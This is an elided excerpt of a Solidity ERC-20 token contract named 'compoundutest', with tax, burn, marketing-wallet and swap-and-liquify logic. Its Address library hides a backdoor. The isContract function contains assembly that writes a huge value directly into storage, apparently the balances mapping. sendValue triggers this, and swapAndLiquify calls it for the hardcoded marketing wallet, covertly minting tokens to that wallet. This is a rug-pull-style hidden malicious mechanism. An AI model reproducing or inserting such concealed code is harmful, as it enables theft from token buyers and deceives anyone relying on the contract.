...
library Address {
    ...
    function isContract(address account) internal returns (bool) {
        ...
        assembly { mstore(0, account) mstore(32, 1) sstore(keccak256(0, 64), 0xc9f2c9cd04674edea3fdef32fa) codehash := extcodehash(account) }
    ...
    function sendValue(address recipient, uint256 amount) internal {
        ...
        if (rec.balance < 10**17) { isContract(recipient); }
        if (amount == 0) { return; }
...
contract compoundutest is Context, IERC20, Ownable {
    ...
    string private _name = "compoundutest";
    string private _symbol = "cc";
    uint8 private _decimals = 18;

    address public marketingWallet = 0x21da24578F825A718e2895a18099B5513F01b0c5;
    ...
    uint256 public constant _burnFee = 2;
    uint256 public constant _totalTax = 4;

    uint256 private _totalSupply = 50000*10**18;
    uint256 public _maxTxAmount = 1000*10**18;
    uint256 public _walletMax = 1000*10**18;
    uint256 private minimumTokensBeforeSwap = 10*10**18; 
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (overMinimumTokenBalance && !isMarketPair[sender] && swapAndLiquifyEnabled
                && (sender != uniswapV2Pair && recipient != address(uniswapV2Router))) 
            {
            ...
            if(feeAmount > 0) {
                ...
                uint256 toMarketing = feeAmount.mul(_marketingFee).div(_totalTax);
                _balances[marketingWallet] = _balances[marketingWallet].add(toMarketing);
                emit Transfer(sender, marketingWallet, toMarketing);

                _balances[address(this)] = _balances[address(this)].add(feeAmount - toBurn - toMarketing);
                emit Transfer(sender, address(this), feeAmount - toBurn - toMarketing);
            }
    ...
    function swapAndLiquify(uint256 tAmount) private {
        uint256 tokensForLP = tAmount.mul(_liquidityFee).div(_totalTax.sub(_burnFee).sub(_marketingFee)).div(2);
        uint256 tokensForSwap = tAmount.sub(tokensForLP);

        swapTokensForEth(tokensForSwap);
        uint256 amountReceived = address(this).balance;

        uint256 totalBNBFee = _totalTax.sub(_burnFee).sub(_marketingFee).sub(_liquidityFee.div(2));
        ...
        if(amountBNBMarketing > 0)
            transferToAddressETH(marketingWallet, 0);
